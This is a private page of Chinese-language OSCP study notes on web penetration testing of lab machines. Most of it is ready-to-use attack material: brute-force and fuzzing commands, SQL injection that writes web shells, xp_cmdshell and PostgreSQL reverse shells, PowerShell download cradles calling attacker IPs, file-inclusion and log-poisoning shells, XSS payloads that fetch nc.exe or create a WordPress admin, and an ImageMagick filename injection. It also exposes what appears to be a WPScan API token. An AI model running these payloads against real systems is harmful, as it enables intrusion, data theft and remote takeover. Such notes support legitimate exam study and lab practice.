+++
title = 'web渗透'
date = 2024-10-11T14:25:59+08:00
draft = false
private = true
show_reading_time = true
categories = 'OSCP笔记'
+++

靶场的关注重点相比实战会更为细节：

1、域名；
2、网站技术架构cms等；
3、目录；
4、弱口令或者默认口令，弱密码不多，但是需要组合，注意用户名大小写，密码名字复用
5、敏感组合拳信息；
6、web漏洞；



# FUZZ

host域名碰撞

```
ffuf -u "http://flight.htb" -H "Host: FUZZ.flight.htb" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -c -t 50 -fs 229
```


## WFUZZ:

```
sudo wfuzz -w /usr/share/wordlists/wfuzz/general/common.txt -u http://sudocuong.com/workinginprogress.php?FUZZ=id --hw=0(看说明)
```

## 子域名爆破

```
wfuzz -w /usr/share/wordlists/amass/subdomains-top1mil-5000.txt -u streetfighterclub.htb -H "Host: FUZZ.streetfighterclub.htb" --hw 717   
```

## 目录扫描：

正常扫描，如果没有东西，又没有其他入口，考虑加大字典、换工具、以及二级目录，各种状态码都有值得一看的必要：

```
gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://192.168.5.104/ -x php,aspx,jsp,html,js

gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -u http://10.10.10.63/ -m HEAD -t 100 --no-error -x php,aspx,jsp,html,js

dirsearch -u  http://192.168.154.129/ 

漏洞字典：
/usr/share/wordlists/dirb/vulns/sharepoint.txt


oscp优化：
dirsearch -u http://192.168.192.141/ --wordlists=/usr/share/wordlists/seclists/Discovery/Web-Content/dirsearch.txt 

这个效果一般
gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://192.168.192.141/ -x php,txt -x php,js,html -m HEAD -t 50

最后版本：
gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://192.168.225.153:8000/partner/ -t 1000 --no-error -b 404,503
```

## http爆破：

```
表单：
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.10.43 http-post-form "/department/login.php:username=^USER^password=^PASS^:F=Invalid" -t 64

hydra -l user -P /usr/share/wordlists/rockyou.txt 192.168.50.201 http-post-form "/index.php:fm_usr=user&fm_pwd=^PASS^:Login failed. Invalid"


摘要认证：
hydra -L 1.txt -P 1.txt 192.168.154.131 http-get /webdav
```

# sql注入：

## mysql

```
连接：
mysql -h10.0.0.1 -uroot -p123
mysql -u school -p'@jCma4s8ZM<?kA' -h localhost

基础语法：
查库名：
union select group_concat(database())#
查表名：
union select group_concat(table_name) from information_schema.tables where table_schema='library'#
查列名：
union select group_concat(column_name) from information_schema.columns where table_name='access' #
查数据：
union select group_concat('\n',id,'\n',service,'\n',username,'\n',password) from access #
写入：
1"UNION SELECT 1,2,"<?php system($_REQUEST['a']);?>" into outfile 'C:/inetpub/wwwroot/cxk5.php'#

手动测试流程：
判断是否有注入：
1'-- -
1"-- -
' or 1=1 -- -
判断列数：
-1' order by 1-- -
-1' union select 1,2,3,4,5-- -

mysql爆数据：
group_concat(schema_name) from information_schema.schemata --+  查询库名
group_concat(table_name) from information_schema.tables where table_schema='webapphacking' --+  查询表名
group_concat(column_name) from information_schema.columns where table_name='表名' --+ 查询列名
```

## mssql

```
mssql爆数据：
https://www.cnblogs.com/-meditation-/articles/16112699.html
https://pentestmonkey.net/cheat-sheet/sql-injection/mssql-sql-injection-cheat-sheet
值得注意的知识点：
sysobjects：记录了数据库中所有表，常用字段为id、name和xtype。
syscolumns：记录了数据库中所有表的字段，常用字段为id、name和xtype。

如果你想在当前数据库上下文中查询名为 Hub_DB的数据库中的表名，你可以使用 Hub_DB..sysobjects 的语法来引用 Hub_DB 数据库中的系统表 sysobjects。这样的查询将会返回 Hub_DB 数据库中所有对象的信息，包括表、视图、存储过程等。
Hub_DB..syscolumns同理

表名很多参考id值，爆表名时记得把ID也爆出来

关键词：Warning
Query

普通盲注：
' AND IF (1=1, sleep(3),'false') --
' OR NOT 1251=1251#
' AND IF (1=1, sleep(3),'false') -- 

简化xp_cmd:
一条：
EXEC sp_configure 'show advanced options',1;RECONFIGURE;EXEC sp_configure 'xp_cmdshell',1;RECONFIGURE;
二条
EXEC master.dbo.xp_cmdshell 'ping 192.168.45.240';

盲注开启xp_cmd:

curl members.streetfighterclub.htb/old/verify.asp -d 

"username=test&password=test&logintype=64738;EXEC+sp_configure+'show+advanced+options',1;EXEC+sp_configure+'Xp_cmdshell',1;RECONFIGURE;+--';&B1=LogIn"

关闭xp_cmd:
curl members.streetfighterclub.htb/old/verify.asp -d "username=test&password=test&logintype=64738;EXEC+sp_configure+'show+advanced+options',1;EXEC+sp_configure+'Xp_cmdshell',0;RECONFIGURE;+--';&B1=LogIn"

验证：
sudo tcpdump -nni tun0 icmp
username=a&password=a&logintype=1;EXEC+Xp_cmdshell+'ping+10.10.16.5';&B1=LogIn

反弹shell:
EXEC master.dbo.xp_cmdshell "powershell.exe -c IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.45.175/nishang.ps1')";
```

xp_cmd命令执行16进制编码，不一定成功

网站：https://kw360.net/ox2str/

```
;declare @x char(8000);set @x=706f7765727368656c6c2b696578286e65772d6f626a6563742b6e65742e776562636c69656e74292e646f776e6c6f6164737472696e672822687474703a2f2f31302e31302e31362e352f496e766f6b652d506f7765725368656c6c5463702e7073312229;waitfor exec master..xp_cmdshell @x
```

获取shell的脚本，原理为通过监听web，base64编码的URL来实现回显：

```
https://gist.github.com/xassiz/51f392afbe1c0374a008fa85d621455e

注意事项：
url要带/，最好为443端口
其中一行改为：
payload += "set @cmdOutput=(SELECT CAST((select stuff((select cast(char(10) as varchar(max)) + line FROM @res for xml path('')), 1, 1, '')) as varbinary(max)) FOR XML PATH(''), BINARY BASE64);"
注意xp_cmd的大小写
```

json格式下的sql注入：

```
转换成unioncode编码即可
https://www.zxgj.cn/g/unicode
```

MSSQL文件写入，适用于不出网场景

将要写入的二进制文件变成16进制

```
#!/usr/bin/env python
# coding=utf-8
import urllib
import binascii
import sys
import os
def str2hex(string):
    hexstr=binascii.b2a_hex(bytes(string, encoding='utf-8'))
    out = bytes("0x", encoding='utf-8')
    out = out + hexstr
    print(out)
def b2a(filename):
    with open(filename,'rb') as f:
        hexstr=binascii.b2a_hex(f.read())
        out = bytes("0x", encoding='utf-8')
        out = out + hexstr
        print(out)
    
if __name__=="__main__":
    filename  = sys.argv[1]
    if os.path.exists(filename):
        b2a(filename)
    else:
        str2hex(filename)
```


不出网文件落地，nc可落地，sql语句：

```
sp_configure 'show advanced options', 1;
RECONFIGURE;
sp_configure 'Ole Automation Procedures', 1;
RECONFIGURE;

DECLARE @ObjectToken INT
EXEC sp_OACreate 'ADODB.Stream', @ObjectToken OUTPUT
EXEC sp_OASetProperty @ObjectToken, 'Type', 1
EXEC sp_OAMethod @ObjectToken, 'Open'
EXEC sp_OAMethod @ObjectToken, 'Write', NULL, 0xhex（替换这里的内容）
EXEC sp_OAMethod @ObjectToken, 'SaveToFile', NULL, 'c:\windows\system32\spool\drivers\color\nc.exe', 2
EXEC sp_OAMethod @ObjectToken, 'Close'
EXEC sp_OADestroy @ObjectToken

```



## Postgre SQL Database

https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/PostgreSQL%20Injection.md

命令执行：

```
3';DROP TABLE IF EXISTS output;CREATE TABLE output(data text);COPY output FROM PROGRAM '/bin/bash -c ''bash -i >& /dev/tcp/192.168.45.240/445 0>&1''';--
```



# 字典收集

```
cewl 192.168.154.131 -w 1.txt     #cewl收集的字典可能存在大小写的问题，值得注意，但是可以自己调参数


常用的英语弱密码字典：
https://raw.githubusercontent.com/insidetrust/statistically-likely-usernames/master/weak-corporate-passwords/english-basic.txt


```

# 本地登录

x-forwarded-for字段
```
firefox modheader插件
```

# 文件包含


## 文件包含

本地文件包含：

```
思路：
主要是读取文件，两个思路：1、读取敏感信息；2、想办法写木马读取，利用日志、session等方式。

读取文件：
windows目录：
C:\Windows\win.ini
在实际操作中，/Windows/win.ini可能可以生效
以及使用curl -x get的方式进行访问，浏览器得打开源码，没有这个方便。

Linux：
读取/home/daniela/.ssh/id_rsa


1、base64:
?file1=php://filter/read=convert.base64-encode/resource=flag.php
?page=php://filter/convert.base64-encode/resource=admin.php
2、data://代码执行
?page=data://text/plain,<?php%20echo%20system('ls');?>

3、base64代码执行：
?page=data://text/plain;base64,PD9waHAgZWNobyBzeXN0ZW0oJF9HRVRbImNtZCJdKTs/Pg==&cmd=ls



写入木马：
1、UA配合accesslog，这种方式大概率只能用一次！！

apache默认日志目录：
/var/log/apache2/access.log
burp修改UA：
<?php echo system($_GET['cmd']); ?>
&号传参

2、session配合
php的session存储和格式如下：
C:\Windows\TEMP\sess_<cookie>
```



远程文件包含：

```
开启HTTP服务，直接反弹shell
```


```
伪协议读文件
php://filter/read=convert.base64-encode/resource=

php命令执行：
<?=`whoami`?>
base64:
注意一些特殊的字符，比如\n啥的，可以换成\T之类的名字，防止出现bug

echo "wget http://10.10.16.9/nc.exe -o C:\\Windows\\TEMP\\T.exe" | iconv -t UTF-16LE | base64

<?=`powershell /enc aQBlAHgAKABuAGUAdwAtAG8AYgBqAGUAYwB0ACAAbgBlAHQALgB3AGUAYgBjAGwAaQBlAG4AdAAp
AC4AZABvAHcAbgBsAG8AYQBkAHMAdAByAGkAbgBnACgAaAB0AHQAcAA6AC8ALwAxADAALgAxADAA
LgAxADYALgA5AC8ASQBuAHYAbwBrAGUALQBQAG8AdwBlAHIAUwBoAGUAbABsAFQAYwBwAC4AcABz
ADEAKQAKAA==`?>


id_rsa中使用默认 RSA 算法，它也可以是id_rsa或id_ecdsa。

```

值得一看的文件包含

```

https://gabb4r.gitbook.io/oscp-notes/web-http/lfi-and-rfi/untitled
```

# SSI注入

```
<!--#exec cmd="id" -->

<!--#EXEC cmd="cat /etc/passwd" -->
```

# ICMP监听

```
sudo tcpdump -nni tun0 icmp
```

# XSS

```
beef
安装：
apt-get install beef-xss
```

## 伪造请求：

案例1：
```
<script src="http://10.10.16.5/1.js"></script>
开启服务器


var request = new XMLHttpRequest();
var params = 'cmd=dir|powershell -c "iwr -uri 10.10.16.5/nc.exe -outfile %temp%\\n.exe"; %temp%\\n.exe -e cmd.exe 10.10.16.5 443';
request.open('POST', 'http://localhost/admin/backdoorchecker.php', true);
request.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
request.send(params);

```

案例2：

```
var ajaxRequest = new XMLHttpRequest(); var requestURL = "/wp-admin/user-new.php"; var nonceRegex = /ser" value="([^"]*?)"/g; ajaxRequest.open("GET", requestURL, false); ajaxRequest.send(); var nonceMatch = nonceRegex.exec(ajaxRequest.responseText); var nonce = nonceMatch[1];
var params = "action=createuser&_wpnonce_create-user="+nonce+"&user_login=attacker&email=attacker@offsec.com&pass1=attackerpass&pass2=attackerpass&role=administrator";
ajaxRequest = new XMLHttpRequest();
ajaxRequest.open("POST", requestURL, true);
ajaxRequest.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
ajaxRequest.send(params);
```
JS压缩：

https://jscompress.com/

JS编码：

```
function encode_to_javascript(string) {
            var input = string
            var output = '';
            for(pos = 0; pos < input.length; pos++) {
                output += input.charCodeAt(pos);
                if(pos != (input.length - 1)) {
                    output += ",";
                }
            }
            return output;
        }
        
let encoded = encode_to_javascript('XXXXXXXSSSSSS')
console.log(encoded)
```

编码后使用：

```
curl -i http://offsecwp --user-agent "<script>eval(String.fromCharCode(xxxxx))</script>"
```

# wordpress

思路：
首先是wpscan扫描，重点在于插件名字和版本号，配合searchsploit查找漏洞。
随后是用户扫描，做字典进行爆破+社工字典（可选）

然后是漏洞利用，未授权的rce最好
其次sql注入，读取admin账户密码，可爆破的
然后是文件读取，读数据账密
/var/www/wp-config.php
/var/www/html/wp-config.php
/var/www/html/main/wp-config.php
/var/www/html/wordpress/wp-config.php
ssh密钥，通过passwd文件可以知道用户名字
/home/daniela/.ssh/id_rsa



## wpscan

```
API:
885u9XNOZWZ2KUhUKOVstFAyUaJ0CSh5x9ZXv5r2UXQ

扫描所有插件：
wpscan --url http://offsecwp -e ap --api-token 885u9XNOZWZ2KUhUKOVstFAyUaJ0CSh5x9ZXv5r2UXQ

扫描漏洞插件：(不准确)
-e vp
爆破用户名：
wpscan --url http://offsecwp -P xxx -U xxx

激进扫描，在常规扫描无果的情况下：
--plugins-detection aggressive
扫描用户：
wpscan --url http://offsecwp -e u
```

## getshell

```
themes路径
http://192.168.5.101/wordpress/wp-content/themes/twentyfourteen/404.php
```

# 文件上传：

```
上传到：
../../../../../../../root/.ssh/authorized_keys


ImageMagick：

cp 1.jpeg '|smile"`echo L2Jpbi9iYXNoIC1jICdiYXNoIC1pID4mIC9kZXYvdGNwLzE5Mi4xNjguNDUuMjEyLzQ0NDQgMD4mMScK | base64 -d | bash`".jpg



.htaccess

<FilesMatch "shana">
SetHandler application/x-httpd-php
</FilesMatch>

上传文件名：
shana.jpg
```

在有身份信息的情况下可以考虑：

```
cadaver tool
cadaver http://192.168.142.122

```

# 命令执行

```
判断执行环境：
(dir 2>&1 *`|echo CMD);&<# rem #>echo PowerShell


在Windows系统下的 cmd命令中，有以下一些截断拼接符。
&前面的语句为假则直接执行后面的
&&前面的语句为假则直接出错，后面的也不执行 
|直接执行后面的语句 
||前面出错执行后面的



在Linux系统下的shell命令中，有以下一些截断拼接符。
在Linux上，上面的;也可以用|、||代替
;前面的执行完执行后面的
| 管道符，上一条命令的输出，作为下一条命令的参数
||当前面的执行出错时执行后面的
& 无论前边语句真假都会执行 
&& 只有前边语句为真，才会执行后边语句

在linux中可以使用`whoami`的方式执行命令

```